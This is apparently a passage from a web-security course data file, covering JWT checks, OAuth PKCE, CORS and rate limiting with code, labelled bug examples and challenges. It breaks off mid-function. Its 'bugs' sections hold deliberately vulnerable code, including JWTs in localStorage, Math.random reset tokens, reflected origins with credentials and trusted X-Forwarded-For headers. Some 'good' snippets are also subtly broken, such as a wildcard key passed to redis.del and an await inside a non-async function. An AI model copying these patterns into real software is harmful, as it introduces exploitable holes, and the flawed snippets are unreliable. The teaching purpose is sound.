// Deliberately DO NOT reveal whether signature failed or claim failed
function authenticateMiddleware(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth?.startsWith("Bearer ")) {
    return res.status(401).json({ error: { code: "NO_TOKEN" } });
  }

  // Check token structure BEFORE passing to jwt.verify
  const token  = auth.slice(7);
  const parts  = token.split(".");
  if (parts.length !== 3) {
    return res.status(401).json({ error: { code: "INVALID_TOKEN" } });
  }

  // Check the algorithm in the header BEFORE verification
  // An algorithm confusion attack sets alg to "none" or "RS256" in the header
  try {
    const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
    if (header.alg !== "HS256") {
      logger.warn("jwt_algorithm_confusion", {
        presentedAlg: header.alg,
        ip: req.ip, requestId: req.requestId
      });
      return res.status(401).json({ error: { code: "INVALID_TOKEN" } });
    }
  } catch {
    return res.status(401).json({ error: { code: "INVALID_TOKEN" } });
  }

  try {
    const payload = tokenService.verify(token);
    req.user      = { id: payload.sub, role: payload.role };
    next();
  } catch (err) {
    // Log details for security monitoring, tell client nothing useful
    if (err.name === "TokenExpiredError") logger.info("token_expired", { ip: req.ip });
    else logger.warn("token_invalid", { error: err.message, ip: req.ip });
    res.status(401).json({ error: { code: "INVALID_TOKEN" } });
  }
}


// OAUTH 2.0 with PKCE ─────────────────────────────────

class OAuthService {
  // Step 1: Generate PKCE pair (client-side in practice, shown here for clarity)
  generatePKCE() {
    const verifier  = crypto.randomBytes(32).toString("base64url");
    const challenge = crypto.createHash("sha256").update(verifier).digest("base64url");
    return { verifier, challenge };
  }

  // Step 2: Build authorization URL
  buildAuthUrl(provider, redirectUri, state, codeChallenge) {
    const params = new URLSearchParams({
      response_type:         "code",
      client_id:             process.env[provider + "_CLIENT_ID"],
      redirect_uri:          redirectUri,
      scope:                 "openid email profile",
      state,                 // random — stored in session — prevents CSRF
      code_challenge:        codeChallenge,
      code_challenge_method: "S256"
    });
    const baseUrls = {
      google: "https://accounts.google.com/o/oauth2/v2/auth",
      github: "https://github.com/login/oauth/authorize"
    };
    return baseUrls[provider] + "?" + params.toString();
  }

  // Step 3: Handle callback
  async handleCallback(provider, code, state, codeVerifier, sessionState) {
    // Verify state matches what we stored — CSRF protection
    if (state !== sessionState) {
      throw new SecurityError("OAuth state mismatch — possible CSRF attack");
    }

    // Exchange code for tokens, sending code_verifier for PKCE validation
    const tokenResponse = await fetch("https://oauth2.example.com/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        grant_type:    "authorization_code",
        client_id:     process.env[provider + "_CLIENT_ID"],
        client_secret: process.env[provider + "_CLIENT_SECRET"],
        code,
        redirect_uri:  process.env.OAUTH_REDIRECT_URI,
        code_verifier: codeVerifier  // PKCE — provider verifies SHA256(verifier)==challenge
      })
    });

    if (!tokenResponse.ok) throw new Error("Token exchange failed");
    const { access_token, id_token } = await tokenResponse.json();

    // Verify id_token signature (in production: use a JWT library with JWKS)
    const userInfo = await this.fetchUserInfo(provider, access_token);
    return this.upsertOAuthUser(provider, userInfo);
  }

  async upsertOAuthUser(provider, profile) {
    let user = await UserRepository.findByOAuthId(provider, profile.sub);
    if (!user) {
      user = await UserRepository.create({
        email:       profile.email,
        name:        profile.name,
        oauthProvider: provider,
        oauthId:     profile.sub,
        isVerified:  true  // OAuth email is pre-verified by provider
      });
    }
    return user;
  }
}


// ACCOUNT LOCKOUT — brute force protection ────────────

class BruteForceProtection {
  constructor(redis) { this.redis = redis; }

  key(type, identifier) { return "brute:" + type + ":" + identifier; }

  async checkAndRecord(type, identifier, limits) {
    const key   = this.key(type, identifier);
    const count = await this.redis.incr(key);

    if (count === 1) {
      await this.redis.expire(key, limits.windowSeconds);
    }

    if (count > limits.max) {
      const ttl = await this.redis.ttl(key);
      throw new RateLimitError("Too many attempts. Try again in " + ttl + "s.");
    }

    return { attempts: count, remaining: limits.max - count };
  }

  async reset(type, identifier) {
    await this.redis.del(this.key(type, identifier));
  }
}

const bruteForce = new BruteForceProtection(redis);

app.post("/auth/login", async (req, res, next) => {
  const { email, password } = req.body;
  try {
    // Check both IP and email (cannot bypass one by rotating the other)
    await bruteForce.checkAndRecord("login_ip",    req.realIp, { max: 20,  windowSeconds: 900 });
    await bruteForce.checkAndRecord("login_email", email,      { max: 10,  windowSeconds: 900 });

    const user = await AuthService.login({ email, password });

    // SUCCESS: reset counters
    await bruteForce.reset("login_ip",    req.realIp);
    await bruteForce.reset("login_email", email);

    const tokens = await tokenService.issueTokenPair(user);
    res.cookie("refresh_token", tokens.refreshToken, {
      httpOnly: true, secure: true, sameSite: "Strict", maxAge: 7 * 86400 * 1000
    });
    res.json({ accessToken: tokens.accessToken, user: sanitize(user) });
  } catch (err) { next(err); }
});`,

    bugs: `// BUG 1: JWT stored in localStorage

// Frontend code (React):
function handleLogin(token) {
  localStorage.setItem("jwt", token); // WRONG
  // Any XSS on your domain reads: localStorage.getItem("jwt")
  // One XSS vulnerability anywhere on your site → all tokens stolen
}

// RIGHT: keep in memory (lost on refresh) or httpOnly cookie
// Server sets the cookie, frontend never touches the token directly
// POST /auth/login → server responds with:
res.cookie("access_token", token, {
  httpOnly: true,   // JS cannot read it
  secure:   true,   // HTTPS only
  sameSite: "Strict",
  maxAge:   15 * 60 * 1000  // 15 min for access token
});
// XSS cannot steal what JS cannot access.


// BUG 2: Not invalidating session on privilege change

async function suspendUserBad(userId) {
  await UserModel.findByIdAndUpdate(userId, { status: "suspended" });
  // User still has a valid JWT for up to 30 days (or whatever exp was set)
  // Suspended user continues API access until token expires
}

async function suspendUserGood(userId) {
  await UserModel.findByIdAndUpdate(userId, { status: "suspended" });
  // Immediately revoke all refresh tokens → next API call fails
  await redis.del("rt:" + userId + ":*");  // or use SCAN pattern
  // Now: token still valid for 15 min (access TTL) BUT cannot be refreshed
  // Max exposure: 15 minutes (the access token TTL)
  // For immediate effect: add userId to a blacklist checked in middleware
  await redis.setex("revoked_user:" + userId, 86400, "1");
}

function authenticate(req, res, next) {
  const payload = verifyToken(token);
  // Check revocation list after token validation
  const revoked = await redis.get("revoked_user:" + payload.sub);
  if (revoked) return res.status(401).json({ error: "Account deactivated" });
  next();
}


// BUG 3: Predictable "forgot password" tokens

async function forgotPasswordBad(email) {
  const token = Math.random().toString(36).substr(2); // WRONG: 36^8 ≈ 2.8 trillion — sounds big
  // Math.random() is NOT cryptographically secure — predictable
  // Attacker can brute-force or predict token ranges
  // Also: no expiry. Link works forever.
}

async function forgotPasswordGood(email) {
  const token    = crypto.randomBytes(32).toString("hex"); // 64 hex chars, 256-bit entropy
  const expiresAt = new Date(Date.now() + 3600000); // 1 hour

  await PasswordResetModel.create({ email, tokenHash: sha256(token), expiresAt });
  // Store HASH of token — if DB is breached, attacker cannot use the hash to reset passwords

  await sendEmail(email, "Reset your password",
    "https://app.com/reset-password?token=" + token
  );
  // Token in URL — user clicks link, sends token in request
  // Server: find record where sha256(token) matches, check expiresAt, verify email
}`,

    challenge: `// CHALLENGE: Implement a complete, secure authentication system
// that is resistant to the 5 most common JWT/session attacks.

// Requirements:

// 1. Secure JWT implementation
//    - Explicit algorithm: HS256 with 32+ byte secret from env
//    - Access token: 15 min, payload: { sub, role, jti }
//    - Refresh token: 7 days, httpOnly cookie, tracked in Redis
//    - Refresh token rotation with family tracking
//    - jti (JWT ID) in every token — enables single-use refresh tokens

// 2. Algorithm confusion prevention
//    - Parse and validate alg from token header BEFORE jwt.verify
//    - Reject any token where alg !== "HS256"
//    - Log the presented algorithm for security monitoring

// 3. Brute force protection (layered)
//    - IP-based: 20 attempts per 15 min window
//    - Email-based: 10 attempts per 15 min window
//    - Progressive delay: 100ms * attempt_count (up to 5 seconds)
//    - Account lockout after 10 email-specific failures (30 min)
//    - Unlock endpoint for admin (with audit log)

// 4. Token refresh with reuse detection
//    - Each refresh token has a family UUID
//    - Refresh: revoke old token, issue new one (rotation)
//    - If an old token in a family is used again: security breach detected
//    - Response: revoke ALL tokens for that user, force re-login everywhere

// 5. Secure password reset
//    - crypto.randomBytes(32) token
//    - Store SHA-256 hash in DB (not the token itself)
//    - 1-hour expiry
//    - Single-use (delete after use)
//    - Rate limit: 3 reset requests per email per hour

// 6. Test all 5 attack scenarios:
//    Attack A: "alg: none" exploit → 401
//    Attack B: expired token reuse → 401
//    Attack C: refresh token reuse → all sessions revoked
//    Attack D: brute force (11 attempts) → 429 then 423 (locked)
//    Attack E: predictable reset token → prove entropy is sufficient`
  },

  {
    id: 6,
    title: "CORS & Same-Origin Policy",
    tag: "Browser Security Model",
    color: "#7c3aed",
    tldr: "CORS is one of the most misunderstood browser security mechanisms. Developers cargo-cult 'Access-Control-Allow-Origin: *' without understanding what they are actually enabling or disabling. Get this wrong in one direction and your API is insecure. Get it wrong in the other and your legitimate frontend cannot make requests.",
    why: `Every developer has hit a CORS error. The instinctive response is "add Access-Control-Allow-Origin: *" and move on. This works for public APIs. It is a significant security misconfiguration for authenticated APIs.

CORS is a browser security mechanism that prevents malicious websites from making authenticated requests to your API using a logged-in user's credentials. If you disable it incorrectly, a phishing site can read your API data with the victim's credentials.

Understanding CORS means:
  - Knowing when to use * vs specific origins.
  - Understanding preflight requests and why they exist.
  - Knowing which headers and methods are "simple" (no preflight).
  - Handling CORS for WebSocket connections (different from HTTP).
  - Understanding that CORS does NOT protect server-to-server requests (it is browser-only).`,

    analogy: `CORS as RESTAURANT SEATING POLICY:

SAME-ORIGIN POLICY — the base rule:
  You ordered food from Restaurant A.
  Their waiter can serve you.
  Restaurant B's waiter CANNOT come to your table and take your food.
  (Scripts from example.com cannot read responses from other-site.com)

CORS — the controlled exception:
  Restaurant A posts a sign: "Waiters from Restaurant B are welcome to serve our tables."
  Now Restaurant B's waiter CAN serve your table — with Restaurant A's permission.
  (api.example.com says: requests from app.example.com are permitted)

THE PREFLIGHT — calling ahead:
  Before making a COMPLEX reservation (custom headers, non-standard methods),
  you call the restaurant ahead of time to check:
  "Can I bring my own sauce? Can my party of 20 come in?"
  Restaurant responds: "Yes, sauce allowed, 20 people fine."
  THEN you show up.
  This is the OPTIONS preflight request.

CREDENTIALS with CORS:
  "Can I run a tab at Restaurant A, even though I am sitting at Restaurant B?"
  Restaurant A must explicitly say: "Yes, we track tabs for guests from Restaurant B."
  Access-Control-Allow-Credentials: true
  AND Access-Control-Allow-Origin must be a SPECIFIC origin (not *).
  You cannot have a tab everywhere with one policy — explicit permission required.

WHY * IS DANGEROUS FOR AUTHENTICATED APIs:
  Bank uses Access-Control-Allow-Origin: * with credentials allowed.
  Evil website makes AJAX request to bank.com/api/balance.
  Browser sends the user's bank session cookies automatically.
  Bank returns the balance. Evil site reads it.
  The user's credentials were sent without their knowledge.
  This is the CSRF via CORS attack.`,

    deep: `SIMPLE REQUESTS (no preflight):
  Method: GET, HEAD, or POST
  Headers: only: Accept, Content-Type (with specific values), Accept-Language
  Content-Type: only: application/x-www-form-urlencoded, multipart/form-data, text/plain

  Simple requests are sent immediately. Browser reads response only if CORS allows.
  But: the REQUEST was made. Server executed it. State changes happened.
  
  This is why you need CSRF protection for cookie-auth APIs — not just CORS.
  CORS prevents reading the response. It does NOT prevent the state change.

PREFLIGHT REQUESTS (OPTIONS):
  Triggered by: PUT, DELETE, PATCH, non-simple POST, custom headers, application/json
  Browser sends OPTIONS first:
  OPTIONS /api/orders HTTP/1.1
  Origin: https://app.example.com
  Access-Control-Request-Method: DELETE
  Access-Control-Request-Headers: Authorization, Content-Type

  Server responds:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
  Access-Control-Allow-Headers: Authorization, Content-Type, X-CSRF-Token
  Access-Control-Max-Age: 86400  ← browser caches preflight for 24 hours (no re-preflight)
  Access-Control-Allow-Credentials: true

  Then browser sends the actual request.

  PERFORMANCE NOTE:
  Without Access-Control-Max-Age: every API call with custom headers = 2 HTTP requests.
  With Max-Age: first call = 2 requests, all others = 1 request for 24 hours.
  This is why you set max-age in production.

CORS IS BROWSER-ONLY:
  curl, Postman, server-to-server — NO CORS checks.
  CORS only protects against browser-executed cross-origin requests.
  It does NOT protect your API from direct attacks.
  You still need: authentication, rate limiting, input validation.
  CORS only prevents a browser-based phishing site from reading your API with user's creds.

CORS FOR WEBSOCKETS:
  WebSocket upgrade is an HTTP request — CORS applies to the initial handshake.
  After upgrade: binary frames — no same-origin restriction.
  Validate Origin header in the upgrade handler.
  Do not rely on CORS middleware for WebSocket auth.`,

    code: `// PRODUCTION CORS CONFIGURATION ──────────────────────

const allowedOrigins = new Set([
  "https://app.example.com",
  "https://www.example.com",
  "https://admin.example.com",
  process.env.NODE_ENV !== "production" ? "http://localhost:3000" : null,
  process.env.NODE_ENV !== "production" ? "http://localhost:5173" : null
].filter(Boolean));

function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;

  // Same-origin requests have no Origin header — always allow
  if (!origin) return next();

  if (allowedOrigins.has(origin)) {
    res.set("Access-Control-Allow-Origin",      origin);
    res.set("Access-Control-Allow-Credentials", "true");
    // Vary: tell CDN to cache separately per Origin
    res.set("Vary", "Origin");
  }
  // Note: if origin is not in allowedOrigins — no CORS headers set.
  // Browser will block the cross-origin response. That is correct.

  // Preflight response
  if (req.method === "OPTIONS") {
    if (allowedOrigins.has(origin)) {
      res.set("Access-Control-Allow-Methods",  "GET, POST, PUT, PATCH, DELETE, OPTIONS");
      res.set("Access-Control-Allow-Headers",  "Authorization, Content-Type, X-CSRF-Token, X-Request-ID");
      res.set("Access-Control-Max-Age",        "86400"); // cache preflight 24 hours
      res.set("Access-Control-Expose-Headers", "X-Request-ID, X-RateLimit-Remaining");
    }
    return res.status(204).end(); // 204 No Content for preflight
  }

  next();
}

// Must be first middleware — before auth, before routes
app.use(corsMiddleware);


// PUBLIC API CORS (no authentication) ─────────────────

// For truly public APIs (no cookies, no auth headers):
app.get("/api/public/products", (req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  // Wildcard is safe here: response contains no user-specific data
  // Browser cannot send cookies with wildcard (browser restriction)
  next();
}, ProductController.listPublic);


// DYNAMIC ORIGIN VALIDATION ───────────────────────────

// For multi-tenant SaaS where tenants have custom domains:
async function dynamicCors(req, res, next) {
  const origin = req.headers.origin;
  if (!origin) return next();

  // Check static list first
  if (allowedOrigins.has(origin)) {
    res.set("Access-Control-Allow-Origin", origin);
    res.set("Access-Control-Allow-Credentials", "true");
    res.set("Vary", "Origin");
    return next();
  }

  // Check tenant custom domains from DB (with cache)
  const tenantDomain = await TenantService.findByOrigin(origin);
  if (tenantDomain) {
    res.set("Access-Control-Allow-Origin", origin);
    res.set("Access-Control-Allow-Credentials", "true");
    res.set("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE");
    res.set("Access-Control-Allow-Headers", "Authorization, Content-Type");
    res.set("Vary", "Origin");
  }
  // If not found: no headers → browser blocks cross-origin response

  next();
}


// WEBSOCKET CORS ──────────────────────────────────────

const WebSocket = require("ws");
const https     = require("https");

const server = https.createServer(tlsOptions, app);
const wss    = new WebSocket.Server({ noServer: true });

// Handle WebSocket upgrade manually — validate Origin
server.on("upgrade", async (req, socket, head) => {
  const origin = req.headers.origin;

  // Validate origin before allowing upgrade
  if (!origin || !allowedOrigins.has(origin)) {
    socket.write("HTTP/1.1 403 Forbidden\\r\\n\\r\\n");
    socket.destroy();
    logger.warn("ws_cors_rejected", { origin, ip: req.socket.remoteAddress });
    return;
  }

  // Authenticate from token in query params (WebSocket cannot set custom headers easily)
  const url    = new URL(req.url, "wss://base");
  const token  = url.searchParams.get("token");
  const user   = await validateToken(token);

  if (!user) {
    socket.write("HTTP/1.1 401 Unauthorized\\r\\n\\r\\n");
    socket.destroy();
    return;
  }

  req.user = user;

  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});`,

    bugs: `// BUG 1: Wildcard with credentials (REJECTED by browsers + security vulnerability)

app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin",      "*");
  res.set("Access-Control-Allow-Credentials", "true"); // WRONG with wildcard
  next();
});
// Browsers REJECT this combination per spec (wildcard + credentials).
// If a browser accepted it: any site could make authenticated requests
// to your API using the user's cookies — CSRF via CORS.
// Fix: use specific origin, not wildcard, when credentials are required.


// BUG 2: Reflecting any Origin without validation

app.use((req, res, next) => {
  // Reflects whatever Origin header the browser sends — ALWAYS
  res.set("Access-Control-Allow-Origin",      req.headers.origin || "*");
  res.set("Access-Control-Allow-Credentials", "true");
  next();
  // Any website can make authenticated requests to your API.
  // Phishing site = full API access with victim's cookies.
  // This is exactly what CORS was designed to prevent — and you disabled it.
});

// FIX: only reflect origin if it is in your allowlist
if (allowedOrigins.has(req.headers.origin)) {
  res.set("Access-Control-Allow-Origin", req.headers.origin);
}
// If not in list: no header → browser blocks the response. Attacker fails.


// BUG 3: Missing Vary header breaks CDN caching

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.has(origin)) {
    res.set("Access-Control-Allow-Origin", origin);
    // MISSING: Vary: Origin
  }
  next();
});
// CDN caches the response for app.example.com.
// Next request from www.example.com: CDN serves cached response.
// That response has Access-Control-Allow-Origin: app.example.com.
// www.example.com gets blocked — CORS error.

// FIX: always add Vary when you reflect the Origin header
res.set("Vary", "Origin");
// Now CDN maintains a separate cache per Origin value.`,

    challenge: `// CHALLENGE: Build a production CORS system for a multi-tenant SaaS.

// The SaaS has:
// - A main frontend: app.example.com
// - An admin panel: admin.example.com
// - A public API: public-api.example.com (for developers, no credentials)
// - Tenant custom domains: tenant.customdomain.com (looked up from DB)
// - A mobile app (no origin — native HTTP client)

// Part 1: CorsService
//   isAllowed(origin): returns the CORS policy for an origin:
//   {
//     allowed:      true/false,
//     allowCreds:   true/false,
//     allowedMethods: string[],
//     maxAge:       number
//   }
//   Policy rules:
//   - app.example.com + admin.example.com → full CORS with credentials
//   - public-api.example.com → wildcard, no credentials
//   - Tenant custom domains (from DB, cached 5 min in Redis) → credentials
//   - No Origin (mobile/server) → always allow (no CORS headers needed)
//   - Unknown origin → deny (no headers)

// Part 2: Middleware using CorsService
//   - Works for both regular requests and preflight
//   - Sets Vary: Origin when reflecting specific origin
//   - preflight: 204 with max-age=86400
//   - Tracks CORS denials per origin per hour in Redis
//   - If same origin denied 100+ times in an hour: log security alert

// Part 3: WebSocket upgrade handler
//   - Validates Origin against CorsService
//   - Rejects invalid origins with 403
//   - Logs: origin, user agent, IP for all rejected upgrades

// Part 4: CORS configuration tester
//   corsTest(origin, method, headers[]) → simulates browser CORS check:
//   Returns: { preflightRequired, allowed, headers, wouldWork: true/false }
//   Test with: allowed origin, disallowed origin, preflight scenario, credentials scenario`
  },

  {
    id: 7,
    title: "Rate Limiting & DDoS Protection",
    tag: "Availability · Abuse Prevention",
    color: "#f59e0b",
    tldr: "Rate limiting is the difference between a service that stays online under attack and one that goes down. Token bucket, sliding window, fixed window — each algorithm has tradeoffs. Layer defense: edge (Cloudflare), load balancer, application. A single rate limiter is not enough.",
    why: `Without rate limiting, a single motivated attacker can bring down your API. A script that sends 10,000 requests per second will exhaust your connection pool, fill your DB query queue, and crash your server in under a minute. This is not theoretical — it happens to startups constantly.

Beyond malicious attacks: rate limiting protects against:
  - Runaway bots hitting your public endpoints
  - Integration partners with buggy code in infinite retry loops
  - Scraping of your product data
  - Credential stuffing (systematic password guessing)
  - SMS/email abuse (sending thousands of verification messages)

Rate limiting also lets you monetize your API — free tier at 100/min, paid at 1000/min.`,

    analogy: `RATE LIMITING ALGORITHMS as AMUSEMENT PARK QUEUING SYSTEMS:

FIXED WINDOW (naïve):
  "100 tickets per hour. Hour resets at :00"
  Problem: burst at the boundary.
  User sends 100 requests at 12:59. Waits 1 second. Sends 100 more at 1:00.
  Server sees 200 requests in 2 seconds — still overloaded despite "limiting."

SLIDING WINDOW:
  "100 requests in any rolling 60-second window."
  Always looking at the last 60 seconds — no reset spike at boundaries.
  More accurate but more memory-intensive.

TOKEN BUCKET (most common, most practical):
  Each user has a bucket of tokens (capacity: 100).
  Tokens drip in at a constant rate (10/second).
  Each request costs 1 token.
  Bucket full: cannot accumulate more.
  Bucket empty: requests rejected until tokens refill.
  
  ADVANTAGE: allows controlled bursting.
  Idle for 10 seconds? You have 100 tokens — can burst 100 in 1 second.
  Makes more real-world sense than fixed windows.

LEAKY BUCKET:
  Requests enter a bucket. Processed at a constant drain rate.
  Bucket full: requests dropped.
  No bursting — smooths traffic to constant output rate.
  Used in network traffic shaping.

LAYERED DEFENSE — why you need multiple layers:
  Cloudflare DDoS protection → stops volumetric attacks (Gbps of traffic)
  Nginx rate limiting → stops connection exhaustion
  Application layer → per-user, per-endpoint, business-rule limits
  
  A sophisticated attacker distributes requests across 1000 IPs.
  Cloudflare handles Gbps. Your app layer sees only a trickle per IP.
  But your app layer catches the same user abusing from different IPs by user ID.`,

    deep: `RATE LIMITER PLACEMENT STRATEGY:

EDGE (Cloudflare, AWS WAF, Fastly):
  Stops volumetric attacks before they reach your infrastructure.
  Absorbs terabits of traffic. Blocks by IP, ASN, geolocation.
  Cannot do user-level rate limiting (no auth context at edge).

REVERSE PROXY / LOAD BALANCER (Nginx, HAProxy):
  Connection-level limiting. "Max 100 connections per IP."
  Cannot do business-level limits (user tier, endpoint-specific).

APPLICATION LAYER (your backend code):
  Full context: userId, subscription tier, specific endpoint.
  Different limits per endpoint: 10 SMS/min, 1000 product reads/min.
  Cannot stop volumetric attacks — your Node.js is already overwhelmed.

RATE LIMIT TIERS (real world):
  Public (unauthenticated):    20 req/min
  Free tier:                   100 req/min
  Pro tier:                    1,000 req/min
  Enterprise tier:             10,000 req/min
  Admin:                       unlimited
  
  Specific endpoints:
  /auth/login:                 5 req/min per IP (brute force protection)
  /auth/send-sms:              3 req/5min per phone number
  /api/reports (expensive):    10 req/hour per user
  /api/webhooks/test:          100/hour per user

SLIDING WINDOW IMPLEMENTATION:
  Redis sorted set where score = timestamp in milliseconds.
  Key: "ratelimit:{userId}:{endpoint}"
  On each request:
  1. ZREMRANGEBYSCORE: remove all entries older than windowStart
  2. ZCARD: count entries in current window
  3. ZADD: add current timestamp if count < limit
  4. PEXPIRE: set TTL to windowMs
  
  O(log N) per request where N is max limit (small). Very fast.

RATE LIMIT HEADERS (RFC 6585, draft-ietf-httpapi-ratelimit-headers):
  RateLimit-Limit:     100
  RateLimit-Remaining: 67
  RateLimit-Reset:     1704067200  (Unix timestamp when limit resets)
  Retry-After: 30  (seconds, sent with 429)`,

    code: `// MULTI-ALGORITHM RATE LIMITER ─────────────────────────

class RateLimiter {
  constructor(redis) { this.redis = redis; }

  // TOKEN BUCKET — allows controlled bursting
  async tokenBucket(key, { capacity, refillRate, refillInterval }) {
    // refillRate tokens added every refillInterval milliseconds
    const now     = Date.now();
    const bucketKey = "tb:" + key;

    const data = await this.redis.hgetall(bucketKey);
    let tokens    = data.tokens    ? parseFloat(data.tokens)    : capacity;
    let lastRefill = data.lastRefill ? parseInt(data.lastRefill) : now;

    // Add tokens based on time elapsed since last refill
    const elapsed = now - lastRefill;
    const tokensToAdd = (elapsed / refillInterval) * refillRate;
    tokens = Math.min(capacity, tokens + tokensToAdd);

    if (tokens < 1) {
      const waitMs = ((1 - tokens) / refillRate) * refillInterval;
      return { allowed: false, tokens: 0, retryAfterMs: Math.ceil(waitMs) };
    }

    tokens -= 1;
    await this.redis.hmset(bucketKey, { tokens: tokens.toString(), lastRefill: now.toString() });
    await this.redis.pexpire(bucketKey, Math.ceil(capacity / refillRate * refillInterval * 2));

    return { allowed: true, tokens: Math.floor(tokens), retryAfterMs: 0 };
  }

  // SLIDING WINDOW — accurate, no boundary bursts
  async slidingWindow(key, { limit, windowMs }) {
    const now         = Date.now();
    const windowStart = now - windowMs;
    const windowKey   = "sw:" + key;

    const pipeline = this.redis.pipeline();
    pipeline.zremrangebyscore(windowKey, 0, windowStart);           // remove old
    pipeline.zcard(windowKey);                                       // count current
    pipeline.zadd(windowKey, now, now + ":" + Math.random());       // add this request
    pipeline.pexpire(windowKey, windowMs);

    const results = await pipeline.exec();
    const count   = results[1][1]; // count BEFORE adding this request

    if (count >= limit) {
      // Find oldest entry to compute retry time
      const oldest = await this.redis.zrange(windowKey, 0, 0, "WITHSCORES");
      const oldestTs   = oldest[1] ? parseInt(oldest[1]) : now;
      const retryAfter = Math.ceil((oldestTs + windowMs - now) / 1000);

      // Remove the request we just added (we are rejecting it)
      await this.redis.zremrangebyscore(windowKey, now, now);
      return { allowed: false, count, retryAfterSec: retryAfter };
    }

    return { allowed: true, count: count + 1, remaining: limit - count - 1 };
  }

  // FIXED WINDOW — simple, fastest
  async fixedWindow(key, { limit, windowSec }) {
    const windowKey = "fw:" + key + ":" + Math.floor(Date.now() / (windowSec * 1000));
    const count     = await this.redis.incr(windowKey);
    if (count === 1) await this.redis.expire(windowKey, windowSec);

    return {
      allowed:   count <= limit,
      count,
      remaining: Math.max(0, limit - count),
      resetSec:  windowSec - (Math.floor(Date.now() / 1000) % windowSec)
    };
  }
}


// RATE LIMITING MIDDLEWARE FACTORY ────────────────────

const limiter = new RateLimiter(redis);

function rateLimit({ limit, windowSec, algorithm = "sliding", keyFn, tier }) {
  return async (req, res, next) => {
    const user = req.user;

    // Tier multipliers
    const multipliers = { free: 1, pro: 10, enterprise: 100, admin: Infinity };
    const userTier    = user?.plan || "free";
    const effectiveLimit = tier
      ? limit * (multipliers[userTier] || 1)
      : limit;

    if (effectiveLimit === Infinity) return next(); // admin bypass

    // Rate limit key: per user (authenticated) or per IP (public)
    const key = keyFn
      ? keyFn(req)
      : user
        ? "user:" + user.id + ":" + req.path
        : "ip:" + req.realIp + ":" + req.path;

    let result;
    switch (algorithm) {
      case "bucket":
        result = await limiter.tokenBucket(key, {
          capacity: effectiveLimit, refillRate: effectiveLimit, refillInterval: windowSec * 1000
        });
        break;
      case "fixed":
        result = await limiter.fixedWindow(key, { limit: effectiveLimit, windowSec });
        break;
      default:
        result = await limiter.slidingWindow(key, { limit: effectiveLimit, windowMs: windowSec * 1000 });
    }

    // Standard rate limit headers
    res.set("RateLimit-Limit",     effectiveLimit);
    res.set("RateLimit-Remaining", result.remaining ?? Math.max(0, effectiveLimit - (result.count || 0)));
    res.set("RateLimit-Reset",     Math.floor(Date.now() / 1000) + windowSec);

    if (!result.allowed) {
      const retryAfter = result.retryAfterSec || result.retryAfterMs ? Math.ceil(result.retryAfterMs / 1000) : windowSec;
      res.set("Retry-After", retryAfter);
      logger.warn("rate_limited", { key, limit: effectiveLimit, userTier, ip: req.realIp });
      return res.status(429).json({
        success: false,
        error: { code: "RATE_LIMITED", message: "Rate limit exceeded. Retry after " + retryAfter + "s." }
      });
    }

    next();
  };
}


// APPLYING RATE LIMITS PER ENDPOINT ───────────────────

// Global baseline
app.use(rateLimit({ limit: 1000, windowSec: 60, algorithm: "sliding" }));

// Auth endpoints — strictest limits
app.post("/auth/login",
  rateLimit({ limit: 5,  windowSec: 60,   algorithm: "fixed", keyFn: (r) => "login_ip:" + r.realIp }),
  rateLimit({ limit: 10, windowSec: 900,  algorithm: "fixed", keyFn: (r) => "login_email:" + r.body.email }),
  AuthController.login
);

app.post("/auth/send-verification-sms",
  authenticate,
  rateLimit({ limit: 3, windowSec: 300, keyFn: (r) => "sms:" + r.user.id }), // 3 per 5 min per user
  rateLimit({ limit: 5, windowSec: 3600, keyFn: (r) => "sms_phone:" + r.body.phone }), // 5 per hour per phone
  AuthController.sendSMS
);

// Expensive endpoints — generous user limit, strict burst limit
app.get("/api/reports",
  authenticate,
  rateLimit({ limit: 10, windowSec: 3600, algorithm: "bucket", tier: true }), // tier-based per hour
  ReportController.generate
);

// Public API — IP-based
app.get("/api/public/*",
  rateLimit({ limit: 100, windowSec: 60, keyFn: (r) => "public:" + r.realIp }),
  PublicController.handler
);


// NGINX RATE LIMITING (in front of Node.js) ───────────
/*
  # /etc/nginx/nginx.conf
  # Layer 1: IP-based connection limiting (before app server)

  http {
    limit_req_zone $binary_remote_addr zone=global:10m rate=100r/s;
    limit_req_zone $binary_remote_addr zone=login:10m  rate=5r/m;
    limit_conn_zone $binary_remote_addr zone=perip:10m;

    server {
      # Global: 100 req/sec per IP, burst of 200 with no delay
      limit_req zone=global burst=200 nodelay;
      limit_conn perip 50;  # max 50 concurrent connections per IP

      location /auth/login {
        limit_req zone=login burst=5;  # strict: 5/min for login
        proxy_pass http://node_app;
      }

      location / {
        limit_req zone=global burst=200 nodelay;
        proxy_pass http://node_app;
      }
    }
  }
*/`,

    bugs: `// BUG 1: Using KEYS in Redis rate limiter — blocks Redis

async function clearRateLimitBad(userId) {
  const keys = await redis.keys("sw:user:" + userId + ":*"); // O(N) — scans ALL keys
  // At 1 million keys: Redis is blocked for 500ms-5 seconds
  // All other Redis operations stall — your entire app hangs
  await redis.del(...keys);
}

async function clearRateLimitGood(userId) {
  let cursor = "0";
  do {
    const [newCursor, keys] = await redis.scan(
      cursor, "MATCH", "sw:user:" + userId + ":*", "COUNT", 100
    );
    cursor = newCursor;
    if (keys.length > 0) await redis.del(...keys);
  } while (cursor !== "0");
}


// BUG 2: Rate limiting by X-Forwarded-For alone (trivially bypassed)

function rateLimitBad(req, res, next) {
  const ip = req.headers["x-forwarded-for"]; // client-controlled!
  // Send: X-Forwarded-For: 1.2.3.4 → rotated per request
  // Completely bypasses IP-based rate limiting
  checkLimit("ip:" + ip, next);
}

function rateLimitGood(req, res, next) {
  // Only trust X-Forwarded-For from known load balancer IPs
  const directIp = req.socket.remoteAddress;
  const trustedProxies = (process.env.TRUSTED_PROXIES || "").split(",");

  let clientIp = directIp;
  if (trustedProxies.includes(directIp)) {
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) clientIp = forwarded.split(",")[0].trim();
  }

